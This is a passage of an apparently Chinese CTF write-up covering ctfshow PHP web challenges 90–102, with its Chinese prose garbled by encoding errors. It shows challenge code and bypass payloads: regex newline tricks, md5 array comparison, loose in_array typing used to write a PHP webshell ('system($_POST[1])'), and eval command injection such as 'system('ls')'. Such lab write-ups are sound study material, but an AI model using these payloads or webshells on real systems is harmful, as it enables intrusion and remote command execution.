punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nonononono'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">Apache HTTPD æ¢è¡Œè§£ææ¼æ´(CVE-2017-15715)ä¸æ‹“å±•</a></p><p>è€ƒå¯Ÿäº†preg_matchçš„&#x2F;mæ¨¡å¼  </p><p>imæ¨¡å¼æ˜¯å¯ä»¥åŒ¹é…å¾ˆå¤šè¡Œ  iæ¨¡å¼åªèƒ½åŒ¹é…ä¸€è¡Œ</p><p>%0aæ¢è¡Œï¼Œç›¸å½“äºenter</p><p>Payloadï¼š</p><blockquote><p>cmd&#x3D;%0aphp</p><p>cmd&#x3D;php%0a1</p></blockquote><h4 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h4><p>å’Œ90å¾ˆåƒä¸è¿‡ç¬¬ä¸€ä¸ªæ¯”è¾ƒå¹¶ä¸æ˜¯å¼ºç±»å‹ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨ç®€å•çš„4476aæˆ–è€…4476.æ¥ç»•è¿‡ï¼Œå…¶ä»–éƒ½å¯ä»¥</p><h4 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h4><p>è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯ä½†æ˜¯å¯ä»¥ä½¿ç”¨8è¿›åˆ¶</p><p>Payload: <code>num=010574</code></p><h4 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™æ®µä»£ç ä¸­çš„ if(!strpos($num, â€œ0â€)){} è¡Œä½¿ç”¨äº† PHP ä¸­çš„ strpos() å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯åœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ç‰¹å®šå­å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚é€æ­¥è§£é‡Šè¿™æ®µä»£ç çš„é€»è¾‘ï¼š 1.strpos($num, â€œ0â€)ï¼šè¿™éƒ¨åˆ†ä»£ç è°ƒç”¨äº† strpos() å‡½æ•°ï¼Œç”¨äºåœ¨ $num å˜é‡ä¸­æŸ¥æ‰¾å­—ç¬¦ â€œ0â€ ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚å¦‚æœæ‰¾åˆ°äº†ï¼Œåˆ™è¿”å›è¯¥ä½ç½®çš„ç´¢å¼•å€¼ï¼ˆç´¢å¼•å€¼ä»0å¼€å§‹ï¼‰ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™è¿”å› falseã€‚</p><p>æ‰€ä»¥å¼€å§‹ä¸èƒ½æœ‰0ï¼Œä½†æ˜¯å¿…é¡»å¾—æœ‰0ï¼Œè€Œä¸”åˆšå¥½ç¬¬ä¸€ä¸ªæ¢æˆäº†å¼ºæ¯”è¾ƒï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨4476.0</p><p>çœ‹å…¶ä»–wpæ˜¯åœ¨å‰é¢åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œä¹Ÿå°±æ˜¯%20ä¹Ÿå¯ä»¥ä½¿ç”¨%0a</p><h4 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h4><p>ç¬¬ä¸€ä¸ªæ”¹å›å»äº†ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨4476.0å…¶ä»–Payloadå¯ä»¥</p><h4 id="web96-ç»•è¿‡"><a href="#web96-ç»•è¿‡" class="headerlink" title="web96(.&#x2F;ç»•è¿‡)"></a>web96(.&#x2F;ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åœ¨Linuxä¸‹.&#x2F;è¡¨ç¤ºå½“å‰ç›®å½•</p><p>Payload:<code>u=./flag.php</code></p><h4 id="web97-md5æ•°ç»„ç»•è¿‡"><a href="#web97-md5æ•°ç»„ç»•è¿‡" class="headerlink" title="web97(md5æ•°ç»„ç»•è¿‡)"></a>web97(md5æ•°ç»„ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> </code></pre><p>è¿™ä¸€é“é¢˜æ¶‰åŠåˆ°äº†å¼ºæ¯”è¾ƒçš„md5ç±»å‹ï¼Œä»ä»£ç æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œè¦æ±‚aã€bä¸¤ä¸ªå€¼ä¸ä¸€æ ·ä½†æ˜¯éœ€è¦è¿™ä¸¤ä¸ªå€¼å¾—md5å€¼ä¸€æ ·ï¼Œå› æ­¤å¼ºæ¯”è¾ƒç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨md5å‡½æ•°å¤„ç†æ•°ç»„ç±»å‹ä¼šè¿”å›falseçš„ç‰¹æ€§ï¼Œä»è€Œåˆ©ç”¨false&#x3D;falseæ¥ç»•è¿‡ã€‚</p><p><a href="https://www.freebuf.com/articles/web/321300.html">CTFçŸ¥è¯†ç‚¹ï¼š å…³äºPHPè¿ç®—ç¬¦&#x3D;&#x3D;&#x3D; ä¸&#x3D;&#x3D;çš„æ€»ç»“</a></p><h4 id="web98-ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€-å¼•ç”¨"><a href="#web98-ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€-å¼•ç”¨" class="headerlink" title="web98(ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€(å¼•ç”¨) )"></a>web98(ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€(å¼•ç”¨) )</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>çœ‹å®Œä¸€å¤´é›¾æ°´</p><p><a href="https://www.php.cn/php-notebook-172859.html">phpå‡½æ•°çš„ä¼ å€¼ä¸ä¼ å€(å¼•ç”¨)è¯¦è§£</a></p><p>è€ƒç‚¹æ˜¯PHPé‡Œé¢çš„ä¸‰å…ƒè¿ç®—ç¬¦å’Œä¼ å€(å¼•ç”¨) ä¼ å€(å¼•ç”¨)æœ‰ç‚¹åƒcè¯­è¨€é‡Œé¢çš„åœ°å€ æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸€ä¸‹ä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token comment">//åªè¦æœ‰è¾“å…¥çš„getå‚æ•°å°±å°†getæ–¹æ³•æ”¹å˜ä¸ºpostæ–¹æ³•(ä¿®æ”¹äº†getæ–¹æ³•çš„åœ°å€)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span></span></code></pre><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ GETä¸€ä¸ª?1(å› ä¸ºGETä¼ å€¼è°ƒç”¨äº†POSTï¼Œæ‰€ä»¥æ— æ‰€è°“) åŠ  POSTä¸€ä¸ªHTTP_FLAG&#x3D;flag </p><h4 id="web99-in-array"><a href="#web99-in-array" class="headerlink" title="web99(in_array)"></a>web99(in_array)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è®¾ç½®ä¸ºæ•°ç»„</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å‘æ•°ç»„é‡Œé¢æ’å…¥éšæœºæ•°</span><span class="token punctuation">&#125;</span> i<span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//in_array()å‡½æ•°æœ‰æ¼æ´ æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° å°±å¯ä»¥å½¢æˆè‡ªåŠ¨è½¬æ¢eg:n=1.phpè‡ªåŠ¨è½¬æ¢ä¸º1</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å†™å…¥1.phpæ–‡ä»¶ å†…å®¹æ˜¯&lt;?php system($_POST[1]);</span><span class="token delimiter important">?></span></span>&#125;?></code></pre><p>array_pushâ€”â€”å¾€æ•°ç»„å°¾éƒ¨æ’å…¥å…ƒç´ <br>rand(1,$i)â€”â€”éšæœºç”Ÿæˆ1-877ä¹‹é—´çš„æ•°<br>&#x2F;&#x2F;æ‰€ä»¥array_push($allow, rand(1,$i))å°±æ˜¯å¾€æ•°ç»„ä¸­æ’å…¥1-877ä¹‹é—´çš„æ•°å­—<br>in_arrayâ€”â€”æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼:<br>in_array(search,array,type)<br>searchä¸ºæŒ‡å®šæœç´¢çš„å€¼<br>arrayä¸ºæŒ‡å®šæ£€ç´¢çš„æ•°ç»„<br>typeä¸ºTRUEåˆ™ å‡½æ•°è¿˜ä¼šæ£€æŸ¥ searchçš„ç±»å‹æ˜¯å¦å’Œ arrayä¸­çš„ç›¸åŒ</p><p>ç»¼ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ•°ç»„ä¸­çš„å€¼æ˜¯intï¼Œè€Œåœ¨å¼±ç±»å‹ä¸­å½“phpå­—ç¬¦ä¸²å’Œintæ¯”è¾ƒæ—¶,å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆintï¼Œæ‰€ä»¥ å­—ç¬¦ä¸²ä¸­æ•°å­—åé¢çš„å­—ç¬¦ä¸²ä¼šè¢«å¿½ç•¥ã€‚é¢˜ç›®ä¸­çš„in_arrayæ²¡æœ‰è®¾ç½®type,æˆ‘ä»¬å¯ä»¥è¾“å…¥å­—ç¬¦ä¸²5.php(æ­¤å¤„æ•°å­—éšæ„ï¼Œåªè¦åœ¨rand(1,0x36d)ä¹‹é—´å³å¯)ï¼Œè½¬æ¢ä¹‹åä¹Ÿå°±æ˜¯5</p><p>çœ‹åˆ°file_put_contentsï¼Œå¯ä»¥ä½¿ç”¨phpä¼ªåè®®</p><h4 id="web100-is-numeric-è¿ç®—ç¬¦ä¼˜å…ˆçº§"><a href="#web100-is-numeric-è¿ç®—ç¬¦ä¼˜å…ˆçº§" class="headerlink" title="web100(is_numeric è¿ç®—ç¬¦ä¼˜å…ˆçº§)"></a>web100(is_numeric è¿ç®—ç¬¦ä¼˜å…ˆçº§)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// v2ä¸èƒ½æœ‰;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// v3å¿…é¡»æœ‰;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿ç®—ç¬¦ä¼˜å…ˆçº§ï¼š**&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or**</p><p><strong>is_numeric()</strong> å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚</p><p>æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSE</p><p><strong>var_dump()<strong>å‡½æ•°å¯ä»¥è¾“å‡ºå¤šä¸ªå€¼ã€‚</strong>print_r</strong>ä¹Ÿå¯ä»¥</p><p><strong>&#x3D;<strong>çš„è¿ç®—ç¬¦æ¯”</strong>and</strong>é«˜</p><p>å¯¹äºv0çš„å€¼åªéœ€è¦çœ‹v1å°±å¯ä»¥v2,v3æ˜¯å¹²æ‰°</p><p>æ‰€ä»¥v1è¾“å…¥æ•°å­—</p><p>Payload:</p><blockquote><p>?v1&#x3D;11&amp;v2&#x3D;var_dump($ctfshow)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p><p>?v1&#x3D;1&amp;v2&#x3D;system(â€˜lsâ€™)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p></blockquote><p>æœ€åflag<code>0x2d</code>è¦è½¬åŒ–ä¸º<code>-</code></p><h4 id="web101-åå°„ç±»"><a href="#web101-åå°„ç±»" class="headerlink" title="web101(åå°„ç±»)"></a>web101(åå°„ç±»)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ¶‰åŠåˆ°ç±»ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ ReflectionClass å»ºç«‹åå°„ç±»ã€‚</p><p>new ReflectionClass($class) å¯ä»¥è·å¾—ç±»çš„åå°„å¯¹è±¡ï¼ˆåŒ…å«å…ƒæ•°æ®ä¿¡æ¯ï¼‰ã€‚</p><p>å…ƒæ•°æ®å¯¹è±¡ï¼ˆåŒ…å«classçš„æ‰€æœ‰å±æ€§&#x2F;æ–¹æ³•çš„å…ƒæ•°æ®ä¿¡æ¯ï¼‰ã€‚</p><p>payloadï¼šv1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p><p>flagä¸­æœ‰äº›å­—ç¬¦ç»è¿‡ACSIIç å˜æ¢ï¼Œå¥½åƒè¿˜å°‘äº†ä¸€ä½ï¼Œçˆ†ç ´å³å¯</p><h4 id="web102-substr-call-user-func"><a href="#web102-substr-call-user-func" class="headerlink" title="web102(substr call_user_func)"></a>web102(substr call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// æˆªå»äº†å‰ä¸¤ä¸ªå­—ç¬¦</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter 